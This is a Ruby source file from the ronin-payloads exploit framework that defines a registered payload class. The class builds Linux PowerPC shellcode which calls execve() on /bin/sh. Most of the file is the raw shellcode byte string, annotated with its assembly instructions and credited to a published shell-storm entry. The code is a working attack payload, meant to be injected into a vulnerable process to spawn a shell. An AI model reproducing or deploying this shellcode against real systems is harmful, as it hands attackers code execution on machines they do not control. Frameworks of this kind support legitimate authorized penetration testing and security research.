# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module PPC
          #
          # Linux PPC shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/linux/ppc/exec_shell'

            arch :ppc
            os :linux

            author "Charles Stevenson", email: 'core@bokeoa.com'

            summary 'Linux PPC execve() shellcode'
            description <<~DESC
              Linux PPC shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-86.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x7c\x3f\x0b\x78" + # mr	r31,r1
                         "\x7c\xa5\x2a\x79" + # xor.	r5,r5,r5
                         "\x42\x40\xff\xf9" + # bdzl+	10000454< main>
                         "\x7f\x08\x02\xa6" + # mflr	r24
                         "\x3b\x18\x01\x34" + # addi	r24,r24,308
                         "\x98\xb8\xfe\xfb" + # stb	r5,-261(r24)
                         "\x38\x78\xfe\xf4" + # addi	r3,r24,-268
                         "\x90\x61\xff\xf8" + # stw	r3,-8(r1)
                         "\x38\x81\xff\xf8" + # addi	r4,r1,-8
                         "\x90\xa1\xff\xfc" + # stw	r5,-4(r1)
                         "\x3b\xc0\x01\x60" + # li	r30,352
                         "\x7f\xc0\x2e\x70" + # srawi	r0,r30,5
                         "\x44\xde\xad\xf2" + # .long	0x44deadf2
                         "/bin/shZ"  # the last byte becomes NULL
            end

          end
        end
      end
    end
  end
end
